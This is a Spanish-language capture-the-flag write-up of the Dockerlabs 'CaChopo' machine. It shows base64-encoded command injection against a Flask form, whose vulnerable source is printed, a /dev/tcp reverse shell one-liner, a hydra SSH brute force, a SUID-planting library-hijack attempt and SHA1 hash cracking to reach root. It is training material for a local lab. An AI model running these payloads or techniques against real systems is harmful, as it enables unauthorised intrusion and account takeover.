
# Writeup Template: Maquina `[ CaChopo ]`

- Tags: #CaChopo #sha1
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina CaChopo](https://mega.nz/file/JTM1wbia#JEZBlPPsakA1fshW80vXltgOGVIjnvakaxPMMbPyZ4s) Laboratorio sobre ataques en entornos web con autenticación insegura.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x cachopo.zip
sudo bash auto_deploy.sh cachopo.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.12.3)
```
---

## Enumeracion de [Servicio Web Principal] `Werkzeug`
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.12.3], IP[172.17.0.2], Python[3.12.3], Script, Title[Cahopos4-4ll], Werkzeug[3.0.3], probably WordPress
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	Sin reporte de rutas:

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py
```

- **Nota**:
	Despues de intentar enumerar por alguna razon no reporta nada, Ahora tenemos un formulario donde podemos realizar una reservacion, pero no funciona
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Lanzaremos **burpsuite** para interceptar como es que se esta enviando los datos atraves de ese formulario
```bash
burpsuite &>/dev/null & disown
```

Ahora ya en el modo **intercept** y con **foxyproxy** listo para pasar la peticon procedemos a llenar el formulario e interceptar la peticion:
```bash
POST /submitTemplate HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2/
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://172.17.0.2
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Priority: u=0

userInput=test
```

Probando estas inyecciones no tuvimos exito:
```bash
userInput={{7*7}}
userInput=test; cat /etc/passwd
userInput=../../../../etc/passwd
userInput=<script>alert(1)</script>
```

Ahora si intentamos modificar el valor a este:
```bash
userInput=1234566d867f7s8ad6fds6f78sd6f78das6f7a8sf678dsa86fd7s8f68sdf6
```

El servidor nos responde:
```bash
Error: Invalid base64-encoded string: number of data characters (61) cannot be 1 more than a multiple of 4
```

### Ejecucion del Ataque
Esto indica que posiblemente esta esperando un valor en **base64**, Por lo cual procedemos a codificar el comando **whoami** para ver como reacciona al reeenviar la peticion:
```bash
echo "whoami" | base64
d2hvYW1pCg==
```

Ejecutamos la peticion desde burpsuite
```bash
# Comandos para explotación
userInput=d2hvYW1pCg==
```

En la respuesta vemos lo siguiente, Tenemos Ejecucion remota de comandos **RCE**
```bash
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Tue, 08 Jul 2025 20:34:13 GMT
Content-Type: text/plain
Content-Length: 9
Connection: close

cachopin
```

Codificamos el comando para enumerar a los usuarios  del sistema objetivo:
```bash
echo "cat /etc/passwd | grep 'sh'" | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAnc2gnCg==
```

El servidor nos responde:
```bash
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Tue, 08 Jul 2025 20:35:43 GMT
Content-Type: text/plain
Content-Length: 174
Connection: close

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
cachopin:x:1001:1001::/home/cachopin:/bin/bash
```
### Intrusion
Ahora ganaremos acceso al objetivo
```bash
nc -nlvp 443
```

Ahora usaremos esta web [ReversheShell](https://www.revshells.com/) para generarnos uns **reverShell** en base64 y asi ganar acceso
```bash
sh -i >& /dev/tcp/172.17.0.1/443 0>&1
c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDMgMD4mMQ==
```

Intentando ganar acceso con una **revershell** no tuvimos exito
```bash
# Reverse shell o acceso inicial
userInput=YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0MyAwPiYx
```

Pero como tenemos un nombre de usuario procedemos a realizar fuerza bruta por **ssh**
```bash
hydra -l cachopin -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://172.17.0.2

[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: cachopin   password: simple
```

Ahora nos conectamos por **ssh**
```bash
ssh-keygen -R 172.17.0.2 && ssh cachopin@172.17.0.2 # ( simple )
```
---

## Escalada de Privilegios
###### Usuario `[ Cachopin ]`:
Tenemos un archivo **sh**
```bash
cat entrypoint.sh 

#!/bin/bash

# Inicia el servicio SSH como root
service ssh start

# Cambia al usuario cachopin para ejecutar la aplicación Flask
exec su - cachopin -c "/home/cachopin/venv/bin/python /home/cachopin/app/app.py"
```

Revisando el contenido de la **app**
```bash
cat app.py 
from flask import Flask, request, render_template, Response
import base64
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submitTemplate', methods=['POST'])
def submit_Template():
    template = request.form.get('userInput', '')
    try:
        decoded = base64.b64decode(template).decode()
        process = subprocess.Popen(decoded, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8') if output else ''
        error_str = error.decode('utf-8') if error else ''
        if error_str:
            return Response(f'Error: {error_str}', content_type='text/plain')
        return Response(output_str, content_type='text/plain')
    except Exception as e:
        return Response(f'Error: {str(e)}', content_type='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

Esto me hace pensar que podemos realizar un secuestro de librerias de python: Ya que el usuario **root** ejecuta este proceso en el sistema
```bash
ps -faux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   6236  4104 ?        Ss   19:49   0:00 su - cachopin -c /home/cachopin/venv/bin/python /home/cachopin/app/app.py
```

Lo que aremos es irnos al directorio tempooral **/tmp** para crear un bianrio malicioso **base64** que contrendra instrucciones maliciosas
```bash
touch base64.py
chmod +x base64.py
```

Como no tenemos el editor **nano** procedemos a inyectar el codigo malicioso de la siguiente manera:
```bash
echo 'import os; os.system("chmod u+s /bin/bash")' > base64.py
```

Una ves inyectado modificamos nuestro **path** del usuario victima para que primero se busque en el directorio temporal y sea ejecutado el binario malicioso
```bash
export PATH=/tmp/:$PAHT
```

Por lo que despues de un rato no logramos secuestrar las librerias de python
```bash
-l /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Enumerando mas directorios,
```bash
cachopin@b11b98f3df66:~/app/com/personal$ pwd
/home/cachopin/app/com/personal
```

Tenemos este archivo:
```bash
-rw-r--r-- 1 cachopin cachopin  185 Jul 25  2024 hash.lst
```

Revisando su contenido tenemos lo sigueinte:
```bash
cat hash.lst

$SHA1$d$GkLrWsB7LfJz1tqHBiPzuvM5yFb=
$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=
$SHA1$d$NxJmRtB6LpHs9vJYpQkErzU8wAv=
$SHA1$d$BvKpTbC5LcJs4gRzQfLmHxM7yEs=
$SHA1$d$LxVnWkB8JdGq2rH0UjPzKvT5wM1=
```

Para romper este cifrado nos tendremos que clonar este repositorio:
```bash
git clone https://github.com/PatxaSec/SHA_Decrypt
```

Explotamos el privilegio
```bash
❯ python3 sha2text.py 'd' '$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=' '/usr/share/wordlists/rockyou.txt'
Processing:   7%|██████████████▎                                                                   

 [+] Pwnd !!! $SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=::::cecina
```

Migramos de usuario
```bash
# Comando para escalar al usuario: ( root )
su root
Password: cecina
root@b11b98f3df66:/home/cachopin/app/com/personal# 
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@b11b98f3df66:/home/cachopin/app/com/personal# whoami
root
```

